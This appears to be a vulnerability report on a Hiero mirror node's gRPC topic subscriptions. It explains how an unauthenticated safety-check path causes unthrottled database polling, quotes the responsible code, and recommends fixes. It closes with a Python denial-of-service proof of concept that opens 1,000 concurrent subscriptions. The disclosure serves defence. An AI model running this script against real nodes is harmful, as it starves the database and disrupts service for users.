### Title
Unthrottled DB Polling Burst via Unauthenticated gRPC Safety-Check Path Enables Resource Exhaustion and Importer Starvation

### Summary
Any unauthenticated external user who opens a gRPC topic subscription automatically triggers a "safety check" after 1 second that invokes the unthrottled retriever path (`throttled=false`). That path unconditionally executes up to 12 polls at 20 ms intervals, each fetching up to 5,000 rows (60,000 rows per subscription in ~240 ms), with no per-subscriber, per-IP, or global rate limit. An attacker opening many concurrent connections multiplies this burst linearly, saturating the shared database's I/O and starving the importer's writes, which delays or prevents gossip transaction data from being stored and served.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` (lines 67–70) schedules a safety check for every subscriber:

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
``` [1](#0-0) 

`missingMessages()` (line 149) calls the unthrottled retriever when `current == null` (safety-check branch):

```java
return topicMessageRetriever.retrieve(gapFilter, false);
``` [2](#0-1) 

`PollingContext` constructor (lines 102–107) sets the unthrottled parameters from `RetrieverProperties.UnthrottledProperties`:

```java
numRepeats = unthrottled.getMaxPolls();      // default 12
frequency  = unthrottled.getPollingFrequency(); // default 20 ms
maxPageSize = unthrottled.getMaxPageSize();  // default 5000
``` [3](#0-2) 

**Root cause — `isComplete()` never short-circuits without a limit:**

```java
boolean isComplete() {
    boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
    if (throttled) {
        return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
    }
    return limitHit;   // ← always false when no limit is set
}
``` [4](#0-3) 

For the throttled path, an empty page (fewer rows than `maxPageSize`) terminates polling early. For the unthrottled path, `isComplete()` returns `false` unconditionally unless the caller set an explicit `limit`. The safety check at line 147 builds `gapFilter` from the subscriber's filter **without adding a limit**, so all 12 polls always execute, even if every poll returns 0 rows. [5](#0-4) 

**Default configuration values:** [6](#0-5) 

### Impact Explanation

Each subscription triggers one unthrottled burst: 12 × 5,000 = **60,000 DB row fetches in ~240 ms**. The mirror node's PostgreSQL database is shared between the gRPC read path and the importer write path. Flooding the DB with concurrent large sequential scans raises I/O wait, degrades query throughput, and can starve the importer's `INSERT`/`UPDATE` operations that persist gossip-derived transaction records. During the saturation window, new consensus transactions are not written to the DB, so subscribers receive stale data and the mirror node falls behind the network. The `timeout` of 60 s per subscription means each attacker connection holds DB resources for up to a minute. [7](#0-6) 

### Likelihood Explanation

**Preconditions:** None beyond network access to gRPC port 5600. No authentication, no API key, no account required.

**Amplification:** `maxConcurrentCallsPerConnection` is 5 (Netty-level limit per TCP connection), but there is no limit on the number of TCP connections from a single IP. An attacker opens N connections × 5 subscriptions = 5N concurrent safety-check bursts firing simultaneously after 1 second. With N=200 connections (trivially achievable with a single machine), that is 1,000 concurrent unthrottled retrievers each issuing 12 × 5,000-row queries in 240 ms — **60 million row fetches in under 250 ms**. [8](#0-7) 

The attack is repeatable: after the 60 s timeout expires, the attacker reconnects and repeats. No special knowledge of the topic structure is needed; subscribing to any valid topic ID suffices.

### Recommendation

1. **Add a limit to the safety-check gap filter.** In `missingMessages()`, cap the unthrottled retrieval to a reasonable bound (e.g., `unthrottled.getMaxPageSize()`) so `isComplete()` can terminate early:
   ```java
   var gapFilter = topicContext.getFilter().toBuilder()
           .startTime(startTime)
           .limit(retrieverProperties.getUnthrottled().getMaxPageSize())
           .build();
   ```

2. **Rate-limit subscriptions per IP/connection.** Enforce a maximum number of concurrent subscriptions per source IP at the Netty/gRPC interceptor layer, independent of `maxConcurrentCallsPerConnection`.

3. **Add a global concurrent-subscription cap.** The existing `subscriberCount` gauge is metrics-only; add a hard ceiling that rejects new subscriptions when the count exceeds a configured threshold.

4. **Make `isComplete()` consistent for unthrottled.** Consider returning `true` when the last page was empty (0 rows) even in unthrottled mode, to avoid burning all `maxPolls` iterations against an empty result set.

### Proof of Concept

```python
import grpc, threading, time
# proto stubs for hiero.mirror.api.proto.ConsensusService
from proto import consensus_pb2, consensus_pb2_grpc

TARGET = "mirror-node-host:5600"
TOPIC  = consensus_pb2.TopicID(topicNum=1)

def subscribe():
    ch = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(ch)
    req  = consensus_pb2.ConsensusTopicQuery(
        topicID=TOPIC,
        consensusStartTime=consensus_pb2.Timestamp(seconds=0)
        # no limit set → safety-check gapFilter also has no limit
    )
    try:
        for _ in stub.subscribeTopic(req):
            pass
    except Exception:
        pass

# Open 200 connections × 5 streams = 1000 concurrent subscriptions
# Each fires the unthrottled burst after 1 s: 12 × 5000 = 60 000 rows
threads = [threading.Thread(target=subscribe) for _ in range(1000)]
for t in threads: t.start()
time.sleep(2)  # DB I/O saturated during this window; importer stalls
```

Steps:
1. Start 1,000 concurrent `subscribeTopic` calls with `startTime=0` and no `limit`.
2. After 1 second, each subscription's safety check fires `retrieve(gapFilter, false)`.
3. Each unthrottled retriever issues 12 sequential DB queries of up to 5,000 rows.
4. Observe DB I/O saturation (e.g., `pg_stat_activity` shows 1,000+ active queries), importer write latency spikes, and mirror node falling behind the network head.
